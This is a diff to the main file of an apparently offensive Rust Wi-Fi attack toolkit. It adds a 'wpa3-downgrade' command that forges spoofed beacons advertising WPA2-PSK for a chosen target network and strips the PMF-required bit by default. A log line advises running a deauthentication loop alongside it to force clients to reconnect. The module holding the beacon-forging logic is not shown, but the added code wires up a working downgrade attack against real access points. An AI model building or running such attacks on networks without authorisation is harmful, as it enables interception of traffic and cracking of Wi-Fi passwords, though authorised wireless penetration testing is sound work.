@@ -19,6 +19,8 @@ mod airodump;
 mod network_recon;
 mod pcap_wrapper;
 mod wpa3_engine;
+#[cfg(target_os = "linux")]
+mod wpa3_downgrade;
 mod aggressive_scanner;
 mod wps_engine;
 mod wep_engine;
@@ -467,6 +469,31 @@ enum Commands {
         /// Interface in monitor mode
         #[arg(short = 'i', long = "interface", required = true)]
         interface: String,
+    },
+    /// WPA3 → WPA2 downgrade: forge spoofed beacons with WPA2-PSK RSN IE
+    #[command(name = "wpa3-downgrade")]
+    Wpa3Downgrade {
+        /// Interface in monitor mode
+        #[arg(short = 'i', long = "interface", required = true)]
+        interface: String,
+        /// Target BSSID (AA:BB:CC:DD:EE:FF)
+        #[arg(short = 'b', long = "bssid", required = true)]
+        bssid: String,
+        /// Target SSID
+        #[arg(short = 's', long = "ssid", required = true)]
+        ssid: String,
+        /// Channel
+        #[arg(short = 'c', long = "channel", default_value_t = 6)]
+        channel: u8,
+        /// Duration in seconds (0 = until Ctrl+C)
+        #[arg(short = 'd', long = "duration", default_value_t = 0)]
+        duration: u64,
+        /// Keep the PMF-required bit (default strips it)
+        #[arg(long = "no-strip-pmf", default_value_t = false)]
+        no_strip_pmf: bool,
+        /// Beacon interval in ms
+        #[arg(long = "rate", default_value_t = 50)]
+        rate: u64,
     },
 
     /// Probe request flood — broadcast probe requests on all channels
@@ -1085,6 +1112,40 @@ async fn main() {
                     }
                 }
                 Err(e) => err!("Failed to open {}: {}", interface, e),
+            }
+        }
+        Commands::Wpa3Downgrade { interface, bssid, ssid, channel, duration, no_strip_pmf, rate } => {
+            section!("WPA3 → WPA2 downgrade on {} → {}", interface, bssid);
+            match wpa3_downgrade::parse_mac(bssid) {
+                Ok(mac) => {
+                    let mut cfg = wpa3_downgrade::DowngradeConfig::new(mac, ssid, *channel);
+                    cfg.strip_pmf = !no_strip_pmf;
+                    if let Err(e) = wpa3_downgrade::set_channel(interface, *channel) {
+                        warn!("Could not set channel {}: {}", channel, e);
+                    }
+                    match wpa3_downgrade::DowngradeInjector::start(interface, cfg, *rate) {
+                        Ok(mut inj) => {
+                            ok!("Downgrade live — PMF {}", if *no_strip_pmf { "kept" } else { "stripped" });
+                            info_log!("Run a deauth loop concurrently to force reassociation");
+                            let deadline = if *duration > 0 {
+                                Some(std::time::Instant::now() + std::time::Duration::from_secs(*duration))
+                            } else {
+                                None
+                            };
+                            loop {
+                                std::thread::sleep(std::time::Duration::from_secs(1));
+                                if let Some(d) = deadline {
+                                    if std::time::Instant::now() >= d { break; }
+                                }
+                                println!("  beacons={} errors={}", inj.sent(), inj.errors());
+                            }
+                            inj.stop();
+                            ok!("Stopped — sent {} beacons, {} errors", inj.sent(), inj.errors());
+                        }
+                        Err(e) => err!("Downgrade failed: {} (need CAP_NET_RAW + monitor)", e),
+                    }
+                }
+                Err(e) => err!("Bad BSSID: {}", e),
             }
         }
         Commands::ProbeFlood { interface, count } => {
